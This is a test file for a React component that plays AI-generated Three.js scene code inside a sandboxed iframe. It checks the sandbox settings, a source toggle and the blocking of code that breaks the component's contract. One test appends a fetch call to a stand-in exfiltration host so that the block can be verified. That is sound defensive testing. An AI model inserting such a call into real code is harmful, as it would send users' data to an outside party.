import { fireEvent, render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import SceneCodePlayer from "../SceneCodePlayer";
import type { SceneRecord } from "../sceneTypes";

const GOOD_CODE = `
function init(ctx) {
  ctx.setCaption("hello");
}
function update(ctx, t) {}
`;

function makeRecord(code: string): SceneRecord {
  return {
    scene_id: "scene_1",
    viz_id: "viz_1",
    article_id: "article_1",
    schema_version: "code-1.0",
    provider: "openai",
    model: "gpt-4o-mini",
    extraction_strategy: "docling",
    scene: {
      format: "threejs-code@1",
      language: "javascript",
      runtime: "three@0.170",
      title: "Test Method",
      algorithm_name: "Test Method",
      summary: "A test scene.",
      code,
    },
    verification: { valid: true, findings: [], checks: "static" },
    valid: true,
    created_at: "2026-01-01T00:00:00Z",
    updated_at: "2026-01-01T00:00:00Z",
  };
}

describe("SceneCodePlayer", () => {
  it("mounts the sandboxed frame for code that passes the contract", () => {
    render(<SceneCodePlayer record={makeRecord(GOOD_CODE)} />);
    const frame = screen.getByTestId("scene-frame");
    // allow-scripts and nothing else: no same-origin, no popups, no forms.
    expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
    expect(frame.getAttribute("srcdoc")).toContain("setCaption");
    expect(screen.getByText("Pause")).toBeInTheDocument();
    expect(screen.getByText("A test scene.")).toBeInTheDocument();
  });

  it("refuses code that violates the contract instead of running it", () => {
    const record = makeRecord(GOOD_CODE + "\nfetch('https://exfil.example')");
    render(<SceneCodePlayer record={record} />);
    expect(screen.getByTestId("scene-code-blocked")).toBeInTheDocument();
    expect(screen.queryByTestId("scene-frame")).toBeNull();
    expect(screen.getByText(/fetch/)).toBeInTheDocument();
  });

  it("shows the source when toggled", () => {
    render(<SceneCodePlayer record={makeRecord(GOOD_CODE)} />);
    fireEvent.click(screen.getByText("Code"));
    expect(screen.getByTestId("scene-code-source")).toBeInTheDocument();
    expect(screen.queryByTestId("scene-frame")).toBeNull();
  });
});
